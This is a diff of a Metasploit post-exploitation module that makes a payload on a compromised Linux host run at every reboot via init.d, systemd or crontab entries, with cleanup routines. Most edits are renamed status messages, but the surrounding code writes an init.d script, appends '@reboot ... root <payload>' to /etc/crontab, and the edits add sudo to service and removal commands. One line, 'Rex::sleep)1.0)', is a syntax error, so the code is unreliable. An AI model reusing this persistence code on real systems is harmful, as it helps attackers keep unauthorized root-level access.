@@ -25,7 +25,7 @@
 #
 # [ MODULE OPTIONS ]
 # The session number to run this module on        => set SESSION 3
-# The asoluct  path of binary to execute          => set REMOTE_PATH /root/agent.sh
+# The remote absoluct  path of binary to execute  => set REMOTE_PATH /root/agent.sh
 # Time to wait for the agent to start             => set START_TIME 15
 # Use 'init.d' to persiste our payload?           => set INITD true
 # Use 'systemd' to persiste our payload?          => set SYSTEMD true
@@ -144,7 +144,7 @@ class MetasploitModule < Msf::Post
                                 OptBool.new('SYSTEMD', [ false, 'Use systemd to persiste our payload?', false]),
                                 OptBool.new('CRONTAB', [ false, 'Use crontab to persiste our payload?', false]),
                                 OptString.new('SESSION', [ true, 'The session number to run this module on', 1]),
-                                OptString.new('REMOTE_PATH', [ false, 'The absoluct path of binary to execute (eg /root/agent.sh)'])
+                                OptString.new('REMOTE_PATH', [ false, 'The remote absoluct path of binary to execute'])
                         ], self.class)
 
                 register_advanced_options(
@@ -191,7 +191,7 @@ if datastore['INITD'] == true || datastore['CRONTAB'] == true
   print_warning("we can only run one persistence technic at a time.")
   return nil
 end
-print_status("Persist: #{remote_path} on #{sysnfo['Computer']}")
+print_status("Persist: #{remote_path} on target system.")
 Rex::sleep(1.0)
 
     #
@@ -212,7 +212,7 @@ Rex::sleep(1.0)
       print_warning("Please upload your agent before running this funtion.")
       return nil
     else
-      print_status("Remote agent full path found.")
+      print_status("Remote payload absoluct path found.")
       Rex::sleep(1.0)
     end
 
@@ -283,7 +283,7 @@ if datastore['SYSTEMD'] == true || datastore['CRONTAB'] == true
   print_warning("we can only run one persistence technic at a time.")
   return nil
 end
-print_status("Persist: #{remote_path} on #{sysnfo['Computer']}")
+print_status("Persist: #{remote_path} on target system.")
 Rex::sleep(1.0)
 
     #
@@ -304,7 +304,7 @@ Rex::sleep(1.0)
       print_warning("Please upload your agent before running this funtion.")
       return nil
     else
-      print_status("Remote agent full path found.")
+      print_status("Remote payload absoluct path found.")
       Rex::sleep(1.0)
     end
 
@@ -312,31 +312,31 @@ Rex::sleep(1.0)
     # Sellect how agent will execute (in persistence script call)
     #
     if datastore['SHEBANG'] == true
-    print_warning("Agent with shebang sellected.")
+    print_warning("Payload with shebang sellected.")
     Rex::sleep(1.0)
       #
       # If used agents with SHEBANG (eg #!/usr/bin/python)
       # TODO: Check Extensions execution using bash ( elf | sh | py | rb | pl ) 
       #
       if remote_path =~ /.elf/
-        print_status("Agent extension sellected: .elf")
+        print_status("Payload extension sellected: .elf")
         trigger = "."
       elsif remote_path =~ /.sh/
-        print_status("Agent extension sellected: bash")
+        print_status("Payload extension sellected: bash")
         trigger = "sh "
       elsif remote_path =~ /.py/
-        print_status("Agent extension sellected: python")
+        print_status("Payload extension sellected: python")
         trigger = "python "
       elsif remote_path =~ /.rb/
-        print_status("Agent extension sellected: ruby")
+        print_status("Payload extension sellected: ruby")
         trigger = "ruby "
       elsif remote_path =~ /.pl/
-        print_status("Agent extension sellected: perl")
+        print_status("Payload extension sellected: perl")
         trigger = "perl "
       else
-        print_error("Agent extension not supported.")
-        print_warning("Please use [sh|elf|py|rb|pl] agent extensions.")
-        print_warning("OR set 'SHELBANG false' to execute agent: ./root/agent")
+        print_error("Payload extension not supported.")
+        print_warning("Please use [sh|elf|py|rb|pl] payload extensions.")
+        print_warning("OR set 'SHELBANG false' to execute payload: ./root/agent")
         return nil
       end
     #
@@ -372,7 +372,7 @@ Rex::sleep(1.0)
         fd = session.fs.file.new(path, 'wb')
         fd.write(initd_data)
         fd.close
-      print_status("Service path: #{script_check}")
+      print_status("Remote service path: #{script_check}")
       Rex::sleep(1.0)
 
       #
@@ -415,7 +415,7 @@ if datastore['INITD'] == true || datastore['SYSTEMD'] == true
   print_warning("we can only run one persistence technic at a time.")
   return nil
 end
-print_status("Persist: #{remote_path} on #{sysnfo['Computer']}")
+print_status("Persist: #{remote_path} on target system.")
 Rex::sleep(1.0)
 
     #
@@ -424,21 +424,21 @@ Rex::sleep(1.0)
     sysnfo = session.sys.config.sysinfo
     serv_file = datastore['CRON_PATH'] # /etc/crontab
     if session.fs.file.exist?(serv_file)
-      print_status("path: #{serv_file} found.")
+      print_status("Remote path: #{serv_file} found.")
       Rex::sleep)1.0)
     else
-      print_error("path #{serv_file} not found.")
+      print_error("Remote path: #{serv_file} not found.")
       return nil
     end
     #
     # Check if agent its deployed (remote) ..
     #
     unless session.fs.file.exist?(remote_path)
-      print_error("agent: #{remote_path} not found.")
-      print_warning("Please upload your agent before running this funtion.")
+      print_error("Payload: #{remote_path} not found.")
+      print_warning("Please upload your payload before running this funtion.")
       return nil
     else
-      print_status("Remote agent full path found.")
+      print_status("Remote payload absoluct path found.")
       Rex::sleep(1.0)
     end
 
@@ -450,14 +450,14 @@ Rex::sleep(1.0)
       print_status("Executing: echo \"@reboot \* \* \* \* root #{remote_path}\" >> #{serv_file}")
       cmd_exec("echo \"@reboot * * * * root #{remote_path}\" >> #{serv_file}")
       Rex::sleep(1.0)
-      print_status("Reloading crontab daemon.")
-      cmd_exec("service cron reload")
+      print_status("Remote reload crontab daemon.")
+      cmd_exec("sudo service cron reload")
       Rex::sleep(1.0)
 
     # final displays
     print_good("Persistence achieved on: #{sysnfo['Computer']}")
     Rex::sleep(1.0)
-    print_warning("#{remote_path} will execute at reboot.")
+    print_warning("Payload: #{remote_path} will execute at reboot.")
     Rex::sleep(1.0)
 end
 
@@ -514,7 +514,7 @@ end
       print_warning("Post-module reports that none persistence was found.")
       return nil
     else
-      print_status("Persistence script full path found.")
+      print_status("Persistence script absoluct path found.")
       Rex::sleep(1.0)
     end
 
@@ -573,7 +573,7 @@ end
       print_error("Post-module reports that none persistence was found.")
       return nil
     else
-      print_status("Persistence script full path found.")
+      print_status("Persistence script absoluct path found.")
       Rex::sleep(1.0)
     end
 
@@ -584,7 +584,7 @@ end
       cmd_exec("update-rc.d persistance remove")
       Rex::sleep(1.5)
       print_status("Removing script from init.d directory.")
-      cmd_exec("rm -f #{script_check}")
+      cmd_exec("sudo rm -f #{script_check}")
       Rex::sleep(1.0)
 
     #
@@ -626,10 +626,10 @@ end
     #
     serv_file = datastore['CRON_PATH'] # /etc/crontab
     unless session.fs.file.exist?(serv_file)
-      print_error("path: #{serv_file} not found.")
+      print_error("Remote path: #{serv_file} not found.")
       return nil
     else
-      print_status("crontab directory full path found.")
+      print_status("Remote crontab file absoluct path found.")
       Rex::sleep(1.0)
     end
 
@@ -639,7 +639,7 @@ end
       remote_path = datastore['REMOTE_PATH']
       print_status("Deleting persistence service (crontab)")
       Rex::sleep(1.0)
-      print_status("Agent absoluct path: #{remote_path}")
+      print_status("Payload absoluct path: #{remote_path}")
       Rex::sleep(1.0)
       print_status("Executing: sed -i \"s|@reboot \\\\* \\\\* \\\\* \\\\* root #{remote_path}||\" #{serv_file}")
       # we need to escape * because sed see them as special chars.
@@ -647,7 +647,7 @@ end
       # we need to escape the remote_path var because sed command uses /// as command separator
       # parse = app_path.gsub('/', '\/')
       # session.shell_command("sed -i 's|@reboot \* \* \* \* root #{parse}||' /etc/crontab")
-      print_status("Reloading crontab daemon.")
+      print_status("Remote Reload crontab daemon.")
       cmd_exec("service cron reload")
       Rex::sleep(1.0)
 
